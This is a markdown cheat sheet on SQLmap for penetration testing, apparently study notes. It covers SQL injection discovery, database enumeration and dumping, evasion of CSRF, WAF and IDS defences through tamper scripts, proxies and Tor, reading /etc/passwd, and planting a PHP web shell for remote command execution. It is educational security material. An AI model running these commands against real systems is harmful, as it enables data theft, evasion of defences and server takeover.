# SQLmap

These notes summarize core techniques for discovery and exploitation of SQL injection vulnerabilities using **SQLmap**. This is by no means an exhaustive guide. 

---

## Table of Contents

- [Overview](#overview)
- [Crafting HTTP Requests](#crafting-http-requests)
  - [GET Requests](#get-requests)
  - [POST Requests](#post-requests)
  - [Parsing Requests From File](#parsing-requests-from-file)
- [Attack Tuning](#attack-tuning)
- [Injection Techniques](#injection-techniques)
- [Database Enumeration](#database-enumeration)
  - [Database Metadata](#database-metadata)
  - [Database Tables, Columns and Rows](#database-tables-columns-and-rows)
- [Bypassing Security Systems](#bypassing-security-systems)
  - [Anti-CSRF Token Bypass](#anti-csrf-token-bypass)
  - [Unique Value Bypass](#unique-value-bypass)
  - [Calculated Parameter Bypass](#calculated-parameter-bypass)
  - [IP Address Concealing](#ip-address-concealing)
  - [WAF Bypass](#waf-bypass)
  - [User-Agent Blacklisting Bypass](#user-agent-blacklisting-bypass)
  - [Tamper Scripts](#tamper-scripts)
- [OS Exploitation](#os-exploitation)
  - [Reading Files](#reading-files)
  - [Writing Files](#writing-files)

---

## Overview

SQLmap is an automated tool designed to discover and exploit SQL injection vulnerabilities. It supports a wide range of database management systems and provides extensive functionality for database enumeration, data extraction, and post-exploitation.

SQLmap includes two built-in help menus.

**Basic listing:**

```bash
sqlmap -h
```

**Advanced listing:**

```bash
sqlmap -hh
```

---

## Crafting HTTP Requests

### GET Requests
When testing GET parameters, parameters are supplied directly in the URL:

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

The **--batch** flag automatically selects default answers for prompts, enabling non-interactive execution.

### POST Requests

For POST requests, parameters are supplied using the **--data** flag:

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

Specific parameters can be marked for testing using the * character:

```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

### Parsing Requests From File

Complex requests are best handled by parsing a raw HTTP request from file. Capture a request in Burp Suite, mark injectable parameters with * and save it:

```bash
sqlmap -r req.txt --batch
```

---

## Attack Tuning

SQLmap payloads are composed of:

- Vector: The SQL code to be executed
- Boundary: Characters surrounding the vector (quotes, comments, parentheses)

SQLmap uses a default payload set, which can be expanded using the following options:

| Flag              | Description                                      |
| ----------------- | ------------------------------------------------ |
| `--risk`          | `Increase payload aggressiveness (1-3)`          |
| `--level`         | `Increase set of vectors and boundaries (1-5)`   |

At default settings (--risk=1 --level=1), SQLmap generates 72 payloads per parameter. At maximum settings (--risk=3 --level=5), this increases to 7865 payloads.

High values are often required when testing authentication mechanisms. But keep in mind that high **--risk** and **--level** values significantly increase noise and the likelihood of detection:

```bash
sqlmap -r req.txt --risk=3 --level=5 --batch -v
```

---

## Injection Techniques

SQLmap attempts all supported injection techniques by default and automatically selects the most effective one for the target.

SQLmap supports six SQL injection techniques, abbreviated BEUSTQ:

- Booleans-based blind (B)
- Error-based (E)
- Union query-based (U)
- Stacked queries (S)
- Time-based blind (T)
- Inline queries (Q)

In certain situations it may be useful to tweak the injection settings. Specific techniques can be selected using the **--technique** flag:

```bash
sqlmap -r req.txt --technique=BEU --batch
```

---

## Database Enumeration

Once an injection point is confirmed, SQLmap can enumerate database metadata. 

### Database Metadata

Common flags:

| Flag              | Description                |
| ----------------- | -------------------------- |
| `--banner`        | `DBMS banner/version`      |
| `--current-user`  | `DB user`                  |
| `--current-db`    | `DB name`                  |
| `--is-dba`        | `Check for DBA privileges` |

**Example:**

```bash
sqlmap -r req.txt --banner --current-user --current-db --is-dba --batch
```

### Database Tables, Columns and Rows

Common flags:

| Flag                      | Description                         |
| ------------------------- | ----------------------------------- |
| `--tables`                | `Enumerate tables`                  |
| `-D`                      | `Specify DB name `                  |
| `-T`                      | `Specify table name`                |
| `-C`                      | `Specify column name`               |
| `--start`                 | `Specific row/s - start range`      |
| `--stop`                  | `Specific row/s - end range`        |
| `--dump`                  | `Dump table contents`               |
| `--dump-all`              | `Dump all DBs`                      |
| `--exclude-sysdbs`        | `Skip system DBs`                   |
| `--schema`                | `Retrieve DB schema`                |
| `--search`                | `Search for DBs, tables or columns` |
| `--all`                   | `Retrieve everything accessible`    |

Enumerate all tables in DB called **testdb**:

```bash
sqlmap -r req.txt --tables -D testdb --batch
```

Dump data from entire **users** table in DB **testdb**:

```bash
sqlmap -r req.txt -D testdb -T users --dump --batch
```

Dump data from specific columns from **users** table in DB **testdb**:

```bash
sqlmap -r req.txt -D testdb -T users -C fname, lname --dump --batch
```

Dump data from specific rows from **users** table in DB **testdb**:

```bash
sqlmap -r req.txt -D testdb -T users --start=2 --stop=4 --dump --batch
```

Dump data from all tables in DB **testdb**:

```bash
sqlmap -r req.txt -D testdb --dump --batch
```

Dump data from all tables from all DBs in the entire DBMS:

```bash
sqlmap -r req.txt --dump-all --exclude-sysdbs --batch
```

Retrieve the structure of each table in DB **testdb**:

```bash
sqlmap -r req.txt --schema --batch
```

Search for DB name containing keyword **master**:

```bash
sqlmap -r req.txt --search -D master --batch
```

Search for table name containing keyword **users**:

```bash
sqlmap -r req.txt --search -T users
```

Search for columns containing keyword **password**

```bash
sqlmap -r req.txt --search -C password --batch
```

Retrieve everything accessible (might take some time):

```bash
sqlmap -r req.txt --all --batch
```

---

## Bypassing Security Systems

### Anti-CSRF Token Bypass

Anti CSRF-tokens are a defense against automated penetration testing tools. This requires each request to have a valid token, obtained by actually interacting with the web page.

SQLmap can attempt to bypass this defense by passing the CSRF-token to the **--csrf-token** flag.

**Example:**

```bash
sqlmap -r req.txt --csrf-token="t0ken" --batch
```

### Unique Value Bypass

Applications sometimes require unique values to be provided to some GET or POST parameter. Such a protection mechanism is similar to anti-CSRF, but does not require the tool to actually parse content on the web page. By ensuring that each request has a unique value assigned to some parameter, the application can prevent CSRF attempts and prevent some automated tools. 

SQLmap can attempt to bypass this security measure by providing the **--randomize** flag with the name of the parameter that holds the unique value.

**Example:**

```bash
sqlmap -r req.txt --randomize=rv --batch
```

### Calculated Parameter Bypass

Applications sometimes calculate a parameter value based on some other parameter. Oftentimes, one parameter has to contain the MD5 hash of another parameter.

SQLmap can attempt to bypass this security measure by passing to the **--eval** flag a Python one-liner that creates an MD5 hash of some parameter.

**Example:**

```bash
sqlmap -r req.txt --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

### IP Address Concealing

A proxy server can be used to conceal one's IP address. 

A proxy server can be passed to the **--proxy** flag, or a list of proxy servers can be passed to the **--proxy-file** flag.

**Examples:**

```bash
sqlmap -r req.txt --proxy="socks4://127.0.0.1:9050" --batch
```

```bash
sqlmap -r req.txt --proxy-file="proxys.txt" --batch
```

An easier way to achieve anonymity is through the Tor network.

When using the **--tor** flag, SQLMap attempts to find and connect to the port running the Tor service. The **--check-tor** flag can be included to make sure that Tor is running properly and serving its purpose of increasing anonymity.

**Examples:**

```bash
sqlmap -r req.txt --tor --batch
```

```bash
sqlmap -r req.txt --tor --check-tor --batch
```

### WAF Bypass

By default, SQLmap sends a special payload to test for the existence of a WAF. Most WAFs will detect this payload and respond accordingly. If stealth is a priority, consider skipping this WAF test by including the **--skip-waf** flag.

**Example:**

```bash
sqlmap -r req.txt --skip-waf --batch
```

### User-Agent Blacklisting Bypass

The default SQLmap user-agent is blacklisted by many security systems. If you receive **5XX** HTTP error codes, consider changing the user-agent by including the **--random-agent** flag.

**Example:**

```bash
sqlmap -r req.txt --random-agent --batch
```

### Tamper Scripts

Tamper scripts are Python scripts written for SQLmap. Tamper scripts are used to evade IDS/IPS systems by modifying the requests in various ways. This is generally the most effective way of bypassing security systems. 

**Examples:**

**List tamper scripts:**

```bash
sqlmap --list-tampers
```

**Use a tamper scripts:**

```bash
sqlmap -r req.txt --tamper=between
```

**Use multiple tamper scripts:**

```bash
sqlmap -r req.txt --tamper=between,randomcase,percentage
```

---

## OS Exploitation

### Reading Files

Reading and writing on a DBMS require certain privileges. Being able to read data is more common than being able to write data. DBA privileges are not always necessary in order to read data, but are an indication that read privileges are present. The **--is-dba** flag checks for DBA privileges.

**Example:**

```bash
sqlmap -r req.txt --is-dba --batch
```

If one has the right privileges the **--file-read** flag can be used to read files and download them on the local system.

**Example:**

```bash
sqlmap -r req.txt --file-read "/etc/passwd"
```

### Writing Files

Writing files is often restricted on modern DBMSs. However, if the attacker is granted these privileges, a web shell can be written to the server in order to gain remote code execution. 

The **--file-write** and **--file-dest** flags are used to write files to a server.

**Example:**

Write web shell to file:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Write web shell to server:

```bash
sqlmap -r req.txt --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

Communicate with web shell:

```bash
curl http://www.example.com/shell.php?cmd=ls+-la
```

SQLmap also has built-in shell capabilities.

**Example:**

```bash
sqlmap -r req.txt --os-shell
```



